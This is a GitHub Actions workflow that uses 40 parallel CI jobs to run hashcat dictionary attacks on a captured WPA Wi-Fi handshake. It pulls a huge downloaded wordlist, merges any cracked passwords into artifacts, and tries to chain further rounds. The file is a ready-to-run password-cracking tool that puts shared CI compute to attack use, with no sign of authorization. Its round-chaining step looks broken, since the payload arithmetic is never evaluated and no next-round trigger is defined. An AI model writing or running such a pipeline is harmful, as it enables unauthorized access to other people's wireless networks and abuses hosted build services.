name: Crack

on:
  workflow_dispatch:
    inputs:
      round:
        description: "Which batch (round) to run"
        required: true
        default: "0"

permissions:
  contents: write
  actions: write

jobs:

  crack:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        index: [
          0,1,2,3,4,5,6,7,8,9,
          10,11,12,13,14,15,16,17,18,19,
          20,21,22,23,24,25,26,27,28,29,
          30,31,32,33,34,35,36,37,38,39
        ]

    steps:
      - uses: actions/checkout@v3

      - name: Install hashcat
        run: |
          sudo apt-get update
          sudo apt-get install -y hashcat

      - name: Download dictionary
        run: |
          wget -q https://download.weakpass.com/wordlists/2088/all_in_one.txt.7z
          7z x all_in_one.txt.7z -o. -y

      - name: Compute slice
        id: slice
        run: |
          ROUND=${{ github.event.inputs.round }}
          CHUNK_LINES=100000000
          JOB_OFFSET=$(( ROUND * 40 * CHUNK_LINES ))

          START=$(( JOB_OFFSET + ${{ matrix.index }} * CHUNK_LINES + 1 ))
          END=$(( JOB_OFFSET + ( ${{ matrix.index }} + 1 ) * CHUNK_LINES ))

          echo "start=$START" >> $GITHUB_OUTPUT
          echo "end=$END" >> $GITHUB_OUTPUT

          echo "Round $ROUND Job ${{ matrix.index }} slice: $START â†’ $END"

      - name: Extract slice
        run: |
          sed -n "${{ steps.slice.outputs.start }},${{ steps.slice.outputs.end }}p" all_in_one.txt > dict_part_${{ matrix.index }}.txt

      - name: Run hashcat
        run: |
          hashcat -m 22000 -a 0 -w 3 \
            hs/wifi-01.hc22000 dict_part_${{ matrix.index }}.txt \
            -o result_${{ matrix.index }}.txt \
            --status --status-timer=60 \
            --potfile-disable || true

      - name: Ensure result exists
        run: |
          if [ ! -f result_${{ matrix.index }}.txt ]; then
            touch result_${{ matrix.index }}.txt
          fi

      - name: Upload result
        uses: actions/upload-artifact@v4
        with:
          name: results_round_${{ github.event.inputs.round }}_${{ matrix.index }}
          path: result_${{ matrix.index }}.txt


  finalize:
    needs: crack
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3

      - name: Download all results
        uses: actions/download-artifact@v4
        with:
          pattern: results_round_${{ github.event.inputs.round }}_*
          merge-multiple: true

      - name: Merge results
        run: |
          cat result_*.txt 2>/dev/null > all_results.txt || true

      - name: Upload merged results
        uses: actions/upload-artifact@v4
        with:
          name: merged_round_${{ github.event.inputs.round }}
          path: all_results.txt

      - name: Trigger next round
        if: ${{ github.event.inputs.round < 7 }}
        uses: peter-evans/repository-dispatch@v3
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          repository: ${{ github.repository }}
          event-type: next-round
          client-payload: |
            { "round": $(( ${{ github.event.inputs.round }} + 1 )) }
